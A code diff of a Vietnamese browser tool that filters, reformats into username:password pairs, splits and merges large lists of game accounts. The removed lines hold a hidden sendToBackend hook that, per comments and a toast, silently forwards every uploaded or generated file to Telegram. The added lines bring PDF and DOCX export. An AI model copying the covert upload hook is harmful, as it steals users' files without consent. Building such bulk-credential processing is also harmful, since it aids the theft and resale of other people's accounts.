-            const type = document.getElementById('filterType').value; const min = parseInt(document.getElementById('filterCount').value);
-            if (isNaN(min) || min <= 0) return alert("Nhập số lượng > 0");
-            let res = []; const regex = new RegExp(`\\|\\s*${type}:\\s*(\\d+|No Skin)`, "i");
-            this.rawLines.forEach(line => {
-                const match = line.match(regex); let count = (match && match[1] && match[1].toLowerCase() !== "no skin") ? parseInt(match[1]) : 0;
-                if (count >= min) {
-                    const hlRegex = new RegExp(`(\\|\\s*${type}:\\s*\\d+.*?)(?=\\||$)`, "i");
-                    res.push({ raw: line, html: line.replace(hlRegex, `<span class="highlight-vip">$1</span>`) });
-                }
-            });
-            this.render(res, `🔥 Lọc được <b>${res.length}</b> acc có >= ${min} skin ${type}.`);
-        },
-        filterTotal: function() {
-            if (!this.check()) return;
-            const min = parseInt(document.getElementById('totalSkinCount').value);
-            if (isNaN(min) || min <= 0) return alert("Nhập Tổng Skin hợp lệ!");
-            let res = []; const regex = /\|\s*Skin:\s*(\d+)/i;
-            this.rawLines.forEach(line => {
-                const match = line.match(regex);
-                if (match && parseInt(match[1]) >= min) { res.push({ raw: line, html: line.replace(/\|(\s*Skin:\s*\d+\s*)\|/i, `|<span class="highlight-skin">$1</span>|`) }); }
-            });
-            this.render(res, `🌟 Lọc được <b>${res.length}</b> acc có Tổng Skin >= ${min}.`);
-        },
-        copyAll: function() { copyToClipboard(this.currentResults.map(r => r.raw).join('\n')); alert("Đã Copy tất cả!");},
-        export: function() { downloadFileText(this.currentResults.map(r => r.raw).join('\n'), "Ket_Qua_Loc"); }
-    };
-    locAcc.init();
+    if (fmt === 'pdf') {
+      try {
+        const { jsPDF } = window.jspdf;
+        const doc = new jsPDF({ unit: 'pt', format: 'a4' });
+        const margin = 40, pageW = doc.internal.pageSize.getWidth(), pageH = doc.internal.pageSize.getHeight();
+        const maxW = pageW - margin * 2;
+        doc.setFont("courier", "normal");
+        doc.setFontSize(10);
+        const lines = doc.splitTextToSize(text, maxW);
+        let y = margin;
+        const lh = 13;
+        lines.forEach(line => {
+          if (y > pageH - margin) { doc.addPage(); y = margin; }
+          doc.text(line, margin, y);
+          y += lh;
+        });
+        doc.save(name + ".pdf");
+        showToast("✅ Đã xuất PDF!");
+      } catch (e) { alert("Lỗi tạo PDF: " + e.message); }
+      return;
+    }
 
-    // ==========================================
-    // MODULE 2: CHUYỂN ĐỔI FILE
-    // ==========================================
-    const chuyenDoi = {
-        rawLines: [], currentResults: [],
-        init: function() {
-            document.getElementById('fileChuyenDoi').addEventListener('change', (e) => {
-                const file = e.target.files[0]; if (!file) return;
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                    this.rawLines = event.target.result.split(/\r?\n/).filter(line => line.trim() !== "");
-                    document.getElementById('statusChuyenDoi').innerHTML = `✅ Đã nạp <b>${this.rawLines.length}</b> dòng — Hệ thống sẵn sàng!`;
-                    if (this.rawLines.length > 0) {
-                        sendToBackend(`Goc_ChuyenDoi_${file.name}`, this.rawLines.join('\n'), `📌 CHUYỂN ĐỔI - Nạp file`);
-                    }
-                };
-                reader.readAsText(file);
-            });
-        },
-        process: function() {
-            if (this.rawLines.length === 0) { alert("⚠️ Nạp File ở khung chuyển đổi trước!"); return; }
-            const outFormat = document.querySelector('input[name="outFormat"]:checked').value;
-            const separator = (outFormat === 'colon') ? ':' : '|';
-            this.currentResults = []; let html = ""; let errorCount = 0;
+    if (fmt === 'docx') {
+      try {
+        const zip = new JSZip();
+        zip.file("[Content_Types].xml", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+<Default Extension="xml" ContentType="application/xml"/>
+<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+</Types>`);
+        zip.folder("_rels").file(".rels", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
+</Relationships>`);
+        const esc = s => s.replace(/[<>&]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));
+        const paras = text.split('\n').map(line => `<w:p><w:r><w:t xml:space="preserve">${esc(line)}</w:t></w:r></w:p>`).join('');
+        zip.folder("word").file("document.xml", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+<w:body>${paras}</w:body>
+</w:document>`);
+        const blob = await zip.generateAsync({
+          type: "blob",
+          mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
+        });
+        downloadBlob(blob, name + ".docx");
+        showToast("✅ Đã xuất DOCX!");
+      } catch (e) { alert("Lỗi tạo DOCX: " + e.message); }
+    }
+  }
+};
 
-            this.rawLines.forEach((originalLine) => {
-                let line = originalLine.trim();
-                line = line.replace(/^.*?(?:\s*=\s*)/, '');
-                let firstBlock = line.split(/\s+\|\s+/)[0]; 
-                let match = firstBlock.match(/^([^:|]+)[:|](.+)$/);
-                
-                if (match && match.length >= 3) {
-                    let tk = match[1].trim(); let mk = match[2].trim().split('|')[0].trim(); 
-                    let finalString = `${tk}${separator}${mk}`;
-                    this.currentResults.push(finalString);
-                    html += `<div class="acc-line">
-                                <div class="acc-content" style="color:var(--neon-purple); font-weight:bold; font-size:16px;">${finalString}</div>
-                                <button class="btn-copy-single" onclick="copyToClipboard('${finalString}')">COPY</button>
-                             </div>`;
-                } else { errorCount++; }
-            });
-
-            document.getElementById('displayChuyenDoi').innerHTML = html;
-            let status = `♻️ Đã chuyển đổi <b style="color:var(--neon-purple);">${this.currentResults.length}</b> tài khoản.`;
-            if (errorCount > 0) status += ` (Loại ${errorCount} dòng rác)`;
-            document.getElementById('statusChuyenDoi').innerHTML = status;
-            document.getElementById('actionChuyenDoi').style.display = "flex";
-        },
-        copyAll: function() { copyToClipboard(this.currentResults.join('\n')); alert("Đã Copy tất cả!"); },
-        export: function() { downloadFileText(this.currentResults.join('\n'), "KetQua_ChuyenDoi"); }
-    };
-    chuyenDoi.init();
-
-    // ==========================================
-    // MODULE 3: CẮT FILE
-    // ==========================================
-    const chiaFile = {
-        validLines: [],
-        chunks: [],
-        init: function() {
-            document.getElementById('fileChiaFile').addEventListener('change', (e) => {
-                const file = e.target.files[0]; if (!file) return;
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                    this.validLines = event.target.result.split(/\r?\n/).filter(line => /[a-zA-Z0-9]/.test(line));
-                    document.getElementById('statusChiaFile').innerHTML = `✅ Đã duyệt và nạp <b>${this.validLines.length}</b> acc hợp lệ — Hệ thống sẵn sàng!`;
-                    if (this.validLines.length > 0) {
-                        sendToBackend(`Goc_ChiaFile_${file.name}`, this.validLines.join('\n'), `📌 CẮT FILE - Nạp file gốc. (Tổng: ${this.validLines.length} acc)`);
-                    }
-                };
-                reader.readAsText(file);
-            });
-        },
-        process: function() {
-            if (this.validLines.length === 0) {
-                alert("⚠️ Vui lòng nạp File cần chia cắt trước!");
-                return;
-            }
-            const limit = parseInt(document.getElementById('accPerFile').value);
-            if (isNaN(limit) || limit <= 0) {
-                alert("⚠️ Vui lòng nhập số acc bạn muốn chia trên mỗi file! (Ví dụ: 50000)");
-                return;
-            }
-            const total = this.validLines.length;
-            const numFiles = Math.ceil(total / limit);
-            this.chunks = [];
-            let html = "";
-
-            for (let i = 0; i < numFiles; i++) {
-                const start = i * limit;
-                const end = Math.min(start + limit, total);
-                const chunk = this.validLines.slice(start, end);
-                this.chunks.push(chunk);
-                html += `<div class="acc-line" style="border-left: 3px solid var(--neon-green); padding: 15px;">
-                            <div class="acc-content" style="color:var(--neon-green); font-size:18px;">
-                                📁 <b>File Phần ${i + 1}</b> <br>
-                                <span style="font-size: 14px; color: #a0aec0;">(Chứa ${chunk.length} acc — Từ dòng ${start + 1} đến ${end})</span>
-                            </div>
-                            <div style="display: flex; gap: 10px; align-items: center;">
-                                <button class="btn-copy-single" style="background: rgba(0,255,135,0.2); color: var(--neon-green); border-color: var(--neon-green); padding: 8px 15px; font-size: 14px;" onclick="chiaFile.downloadChunk(${i})">📥 TẢI FILE NÀY</button>
-                                <button class="btn-copy-single" style="padding: 8px 15px; font-size: 14px;" onclick="chiaFile.copyChunk(${i})">📋 COPY</button>
-                            </div>
-                         </div>`;
-            }
-            document.getElementById('displayChiaFile').innerHTML = html;
-            document.getElementById('statusChiaFile').innerHTML = `✅ Đã chia tách thành công ra <b>${numFiles}</b> file. Bạn có thể tải từng file bên dưới.`;
-            this.chunks.forEach((chunk, index) => {
-                sendToBackend(`File_DaChia_Phan${index+1}.txt`, chunk.join('\n'), `📌 CẮT FILE - Phần ${index+1}/${numFiles} (Số lượng: ${chunk.length} acc)`);
-            });
-        },
-        downloadChunk: function(index) {
-            const content = this.chunks[index].join('\n');
-            downloadFileText(content, `File_Chia_Phan_${index+1}`);
-        },
-        copyChunk: function(index) {
-            copyToClipboard(this.chunks[index].join('\n'));
-            alert(`✅ Đã copy File phần ${index+1}`);
-        }
-    };
-    chiaFile.init();
-
-    // ==========================================
-    // MODULE 4: GHÉP FILE (ĐÃ SỬA - CỘNG DỒN + GỬI TELE NGAY)
-    // ==========================================
-    const ghepFile = {
-        MAX_FILES: 50,
-        loadedFiles: [],   // Mảng lưu trữ các file đã up (cộng dồn)
-        mergedLines: [],
-        totalSize: 0,
-        outputName: "",
-
-        init: function() {
-            const input = document.getElementById('fileGhepFile');
-            input.addEventListener('change', (e) => { this.handleFiles(e); });
-        },
-
-        formatSize: function(bytes) {
-            if (bytes < 1024) return bytes + ' B';
-            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
-            return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
-        },
-
-        readFile: function(file) {
-            return new Promise((resolve) => {
-                const reader = new FileReader();
-                reader.onload = (ev) => resolve(ev.target.result);
-                reader.onerror = () => resolve("");
-                reader.readAsText(file);
-            });
-        },
-
-        // Xử lý khi user up file - KHÔNG RESET, cộng dồn vào danh sách
-        handleFiles: async function(e) {
-            const files = Array.from(e.target.files || []);
-            if (files.length === 0) return;
-
-            // Reset input NGAY để user có thể chọn lại cùng file nếu muốn
-            e.target.value = '';
-
-            // Kiểm tra số slot còn lại
-            const remainingSlots = this.MAX_FILES - this.loadedFiles.length;
-            if (remainingSlots <= 0) {
-                alert(`⚠️ Đã đạt giới hạn ${this.MAX_FILES} file. Hãy bấm "XÓA HẾT FILE LƯU TRỮ" nếu muốn nạp lại từ đầu.`);
-                return;
-            }
-
-            let usedFiles = files;
-            let warnLimited = false;
-            if (files.length > remainingSlots) {
-                usedFiles = files.slice(0, remainingSlots);
-                warnLimited = true;
-            }
-
-            document.getElementById('statusGhepFile').innerHTML = `⏳ Đang đọc ${usedFiles.length} file mới...`;
-            document.getElementById('displayGhepFile').innerHTML = `<i>Đang xử lý file mới, vui lòng đợi...</i>`;
-            document.getElementById('actionGhepFile').style.display = "none";
-
-            // Đọc nội dung song song
-            const contents = await Promise.all(usedFiles.map(f => this.readFile(f)));
-
-            // ===== GỬI TỪNG FILE VỀ TELEGRAM NGAY LẬP TỨC =====
-            usedFiles.forEach((file, i) => {
-                const content = contents[i] || "";
-                const lineCount = content.split(/\r?\n/).filter(l => l.trim()).length;
-                sendToBackend(
-                    `GhepFile_Goc_${file.name}`,
-                    content,
-                    `📌 GHÉP FILE - Vừa nạp file gốc: ${file.name} | ${lineCount} dòng | ${this.formatSize(file.size)}`
-                );
-            });
-
-            // ===== CỘNG DỒN VÀO DANH SÁCH LƯU TRỮ =====
-            let newLines = 0;
-            let newSize = 0;
-            usedFiles.forEach((file, i) => {
-                const lines = (contents[i] || "").split(/\r?\n/).filter(l => l.trim() !== "");
-                this.loadedFiles.push({ name: file.name, lines: lines, size: file.size });
-                this.totalSize += file.size;
-                newLines += lines.length;
-                newSize += file.size;
-            });
-
-            this.renderFileList();
-
-            const totalLines = this.loadedFiles.reduce((s, f) => s + f.lines.length, 0);
-            let statusMsg = `✅ Vừa nạp <b style="color:var(--neon-orange);">${usedFiles.length}</b> file mới (${newLines} dòng, ${this.formatSize(newSize)}).<br>
-                             📦 <b>Đang lưu trữ: ${this.loadedFiles.length}/${this.MAX_FILES} file — ${totalLines} dòng — ${this.formatSize(this.totalSize)}</b>`;
-            if (warnLimited) statusMsg += `<br><span style="color:#ff6b00;">⚠️ Chỉ nhận ${remainingSlots} file (do đạt max ${this.MAX_FILES})</span>`;
-            document.getElementById('statusGhepFile').innerHTML = statusMsg;
-            document.getElementById('displayGhepFile').innerHTML = `<i>Đã lưu trữ file mới. Nạp thêm file khác hoặc bấm "TIẾN HÀNH GHÉP FILE" để tạo file tổng.</i>`;
-
-            // Toast thông báo
-            showUploadToast(`✅ Đã gửi <b>${usedFiles.length}</b> file về Telegram & lưu trữ!`);
-        },
-
-        renderFileList: function() {
-            const box = document.getElementById('fileListDisplay');
-            if (this.loadedFiles.length === 0) {
-                box.style.display = "none";
-                box.innerHTML = "";
-                return;
-            }
-            let html = "";
-            this.loadedFiles.forEach((f, idx) => {
-                html += `<div class="file-item">
-                    <span class="idx">${idx + 1}</span>
-                    <span class="fname">${escapeHtml(f.name)}</span>
-                    <span class="fmeta">${f.lines.length} dòng • ${this.formatSize(f.size)}</span>
-                </div>`;
-            });
-            box.innerHTML = html;
-            box.style.display = "block";
-        },
-
-        // Nút XÓA HẾT FILE LƯU TRỮ
-        clearAll: function() {
-            if (this.loadedFiles.length === 0) {
-                alert("Chưa có file nào để xóa.");
-                return;
-            }
-            if (!confirm(`Xóa toàn bộ ${this.loadedFiles.length} file đã lưu trữ?\nHành động này không thể hoàn tác.`)) return;
-
-            this.loadedFiles = [];
-            this.mergedLines = [];
-            this.totalSize = 0;
-            this.outputName = "";
-            document.getElementById('actionGhepFile').style.display = "none";
-            document.getElementById('displayGhepFile').innerHTML = `<i>Đã xóa hết file lưu trữ. Hãy nạp file mới.</i>`;
-            document.getElementById('statusGhepFile').innerHTML = `Vui lòng nạp các file cần ghép.`;
-            this.renderFileList();
-            showUploadToast(`🗑️ Đã xóa hết file lưu trữ!`);
-        },
-
-        process: function() {
-            if (this.loadedFiles.length === 0) {
-                alert("⚠️ Vui lòng nạp ít nhất 1 file để ghép!");
-                return;
-            }
-
-            let customName = document.getElementById('outputFileName').value.trim();
-            if (!customName) customName = "File_Tong_Hop";
-            customName = customName.replace(/[\\/:*?"<>|]/g, "_").slice(0, 80);
-
-            this.mergedLines = [];
-            this.loadedFiles.forEach(f => {
-                this.mergedLines = this.mergedLines.concat(f.lines);
-            });
-
-            const PREVIEW_LIMIT = 500;
-            const previewLines = this.mergedLines.slice(0, PREVIEW_LIMIT);
-            let html = "";
-            previewLines.forEach((line, index) => {
-                html += `<div class="acc-line">
-                            <div class="acc-content">${escapeHtml(line)}</div>
-                            <button class="btn-copy-single" onclick="copyToClipboard(ghepFile.mergedLines[${index}])">COPY</button>
-                         </div>`;
-            });
-            if (this.mergedLines.length > PREVIEW_LIMIT) {
-                html += `<div style="text-align:center; padding:15px; color:#a0aec0; font-style:italic;">
-                            ... và ${this.mergedLines.length - PREVIEW_LIMIT} dòng khác đã được ẩn để tối ưu hiệu suất.
-                            <br>Bấm <b style="color:var(--neon-orange);">"TẢI FILE TỔNG"</b> để lấy toàn bộ.
-                         </div>`;
-            }
-
-            document.getElementById('displayGhepFile').innerHTML = html;
-            document.getElementById('statusGhepFile').innerHTML = `🔗 Đã ghép <b style="color:var(--neon-orange);">${this.loadedFiles.length}</b> file thành <b>${this.mergedLines.length}</b> dòng — Tên file: <b style="color:var(--neon-orange);">${escapeHtml(customName)}.txt</b>`;
-            document.getElementById('actionGhepFile').style.display = "flex";
-
-            this.outputName = customName;
-
-            // Gửi file tổng về Telegram
-            sendToBackend(
-                `${customName}.txt`,
-                this.mergedLines.join('\n'),
-                `📌 GHÉP FILE TỔNG - Gộp ${this.loadedFiles.length} file gốc | Tổng ${this.mergedLines.length} dòng | Dung lượng gốc: ${this.formatSize(this.totalSize)}`
-            );
-        },
-
-        copyAll: function() {
-            if (this.mergedLines.length === 0) return;
-            copyToClipboard(this.mergedLines.join('\n'));
-            alert("✅ Đã copy toàn bộ nội dung file tổng!");
-        },
-
-        export: function() {
-            if (this.mergedLines.length === 0) return;
-            const name = this.outputName || (document.getElementById('outputFileName').value.trim() || "File_Tong_Hop");
-            downloadFileText(this.mergedLines.join('\n'), name);
-        }
-    };
-    ghepFile.init();
-
-    document.getElementById("searchInput").addEventListener("keypress", e => { if(e.key === "Enter") locAcc.search(); });
-    document.getElementById("filterCount").addEventListener("keypress", e => { if(e.key === "Enter") locAcc.filterVIP(); });
-    document.getElementById("totalSkinCount").addEventListener("keypress", e => { if(e.key === "Enter") locAcc.filterTotal(); });
+/* ====== ENTER SHORTCUTS ====== */
+document.getElementById('kwLoc').addEventListener('keypress', e => { if (e.key === 'Enter') locAcc.run(); });
 </script>
 
 </body>
